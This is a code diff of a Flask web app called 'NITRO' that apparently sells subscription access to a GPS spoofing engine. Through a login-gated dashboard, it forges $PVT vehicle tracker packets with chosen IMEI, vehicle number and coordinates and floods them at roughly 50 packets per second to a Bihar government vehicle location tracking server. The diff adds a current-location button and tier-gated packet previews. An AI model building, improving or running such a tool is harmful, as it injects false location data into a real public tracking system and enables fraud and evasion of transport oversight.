@@ -3,7 +3,7 @@ from datetime import datetime
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "nitro_secret_v82_pro"
+app.secret_key = "nitro_v82_pro_final"
 
 # --- CONFIGURATION ---
 FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
@@ -17,7 +17,6 @@ TAG_LIST = [
 # --- ENGINE STATE ---
 status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "", "lon": ""}
 
-# --- UI: LOGIN PAGE ---
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html>
@@ -34,19 +33,18 @@ LOGIN_HTML = """
 </head>
 <body>
     <div class="login-box">
-        <h2 style="letter-spacing: 2px;">🚀 NITRO LOGIN</h2>
+        <h2>🚀 NITRO LOGIN</h2>
         {% if error %}<div class="msg">{{error}}</div>{% endif %}
         <form method="post">
-            <input type="text" name="userid" placeholder="ENTER USER ID" required>
-            <input type="password" name="password" placeholder="ENTER PASSWORD" required>
-            <button class="btn">START SYSTEM</button>
+            <input type="text" name="userid" placeholder="USER ID" required>
+            <input type="password" name="password" placeholder="PASSWORD" required>
+            <button class="btn">LOGIN</button>
         </form>
     </div>
 </body>
 </html>
 """
 
-# --- UI: DASHBOARD ---
 DASH_HTML = """
 <!DOCTYPE html>
 <html>
@@ -63,11 +61,12 @@ DASH_HTML = """
         input, select { width: 90%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
         .full { grid-column: span 2; }
         .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
-        .start { background: #008000; color: #fff; box-shadow: 0 0 10px #0f0; }
+        .start { background: #008000; color: #fff; }
         .stop { background: #800; color: #fff; }
+        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
         .reset { background: #333; color: #fff; }
         .logout { background: none; color: #f00; border: 1px solid #f00; padding: 5px; font-size: 10px; cursor: pointer; float: left; }
-        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; line-height: 1.4; }
+        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
         label { font-size: 11px; color: #aaa; margin-left: 5px; }
     </style>
 </head>
@@ -84,6 +83,8 @@ DASH_HTML = """
             <div><label>LATITUDE (7 DIGIT)</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updateUI()"></div>
             <div><label>LONGITUDE (7 DIGIT)</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updateUI()"></div>
             
+            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
+
             <div class="full">
                 <label>PROTOCOL (50 PKT/SEC)</label>
                 <select name="proto" id="proto" onchange="updateUI()">
@@ -92,10 +93,12 @@ DASH_HTML = """
                 </select>
             </div>
 
-            <div class="full">
+            {% if session['access_level'] == 'pro' %}
+            <div class="full" id="pro-box">
                 <label>📋 PACKET PREVIEW</label>
                 <div class="preview" id="preview">Ready...</div>
             </div>
+            {% endif %}
 
             <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
             <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
@@ -117,10 +120,9 @@ DASH_HTML = """
         function updateUI() {
             let v = document.getElementById('vno').value.toUpperCase();
             let i = document.getElementById('imei').value;
-            
-            // 7-Digit Precision Logic
             let rawLat = document.getElementById('lat').value;
             let rawLon = document.getElementById('lon').value;
+            
             let la = rawLat ? parseFloat(rawLat).toFixed(7) : "0.0000000";
             let lo = rawLon ? parseFloat(rawLon).toFixed(7) : "0.0000000";
             
@@ -128,19 +130,26 @@ DASH_HTML = """
             let h = new Date().toLocaleTimeString('en-GB', {hour12: false}).replace(/:/g, '');
             let t = tags[currentCnt % tags.length];
 
-            // Full string for PRO users only
-            let fullPacket = `$PVT,${t},${i},${v},1,${d},${h},${la},N,${lo},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*`;
-            
-            {% if session['access_level'] == 'pro' %}
-                document.getElementById('preview').innerText = fullPacket;
-            {% else %}
-                document.getElementById('preview').innerText = `$PVT,${t},${i},${v},1,${d},${h},${la},N,${lo},E,0.0...DDE3*`;
-            {% endif %}
+            let previewBox = document.getElementById('preview');
+            if (previewBox) {
+                let fullPacket = `$PVT,${t},${i},${v},1,${d},${h},${la},N,${lo},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*`;
+                previewBox.innerText = fullPacket;
+            }
 
-            if(la != "0.0000000") {
+            if(rawLat && rawLon) {
                 let pos = [parseFloat(la), parseFloat(lo)];
                 map.setView(pos, 15);
                 marker.setLatLng(pos);
+            }
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    document.getElementById('lat').value = pos.coords.latitude.toFixed(7);
+                    document.getElementById('lon').value = pos.coords.longitude.toFixed(7);
+                    updateUI();
+                }, () => alert("Location denied."));
             }
         }
 
@@ -158,39 +167,30 @@ DASH_HTML = """
 </html>
 """
 
-# --- HELPERS ---
 def get_user_data(uid):
     try:
         r = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", timeout=5)
         return r.json()
     except: return None
 
-# --- FIRING ENGINE ---
 def firing_engine():
     target = ("vlts.bihar.gov.in", 9999)
     while status["firing"]:
         try:
             tag = TAG_LIST[status["count"] % len(TAG_LIST)]
             now = datetime.now()
-            
-            # Format Lat/Lon to 7 digits in the background packet too
             f_lat = "{:.7f}".format(float(status["lat"])) if status["lat"] else "0.0000000"
             f_lon = "{:.7f}".format(float(status["lon"])) if status["lon"] else "0.0000000"
-            
             pkt = f"$PVT,{tag},{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{f_lat},N,{f_lon},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
-            
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if status["proto"] == "UDP" else socket.SOCK_STREAM)
             if status["proto"] == "TCP":
                 sock.settimeout(3); sock.connect(target); sock.send(pkt)
-            else:
-                sock.sendto(pkt, target)
-            
+            else: sock.sendto(pkt, target)
             status["count"] += 1
             sock.close()
             time.sleep(0.02)
         except: time.sleep(1)
 
-# --- ROUTES ---
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if 'user' in session: return redirect(url_for('dashboard'))
@@ -199,24 +199,18 @@ def login():
         uid = request.form.get('userid', '').strip()
         pw = request.form.get('password', '').strip()
         data = get_user_data(uid)
-        
         if data and str(data.get('password')) == str(pw):
-            # Check Expiry
             exp_str = data.get('expiry', '2000-01-01')
-            expiry = datetime.strptime(exp_str, '%Y-%m-%d')
-            
-            if datetime.now() > expiry:
+            if datetime.now() > datetime.strptime(exp_str, '%Y-%m-%d'):
                 error = f"EXPIRED ON {exp_str}"
             elif data.get('status') != "Active":
                 error = "ACCOUNT BLOCKED!"
             else:
                 session['user'] = uid
                 session['access_level'] = data.get('access_level', 'basic')
-                # Auto-fill lat/lon from Firebase
                 status.update({"lat": str(data.get('lat', '')), "lon": str(data.get('lon', ''))})
                 return redirect(url_for('dashboard'))
-        else:
-            error = "INVALID ID OR PASSWORD"
+        else: error = "INVALID ID OR PASSWORD"
     return render_template_string(LOGIN_HTML, error=error)
 
 @app.route('/dashboard')
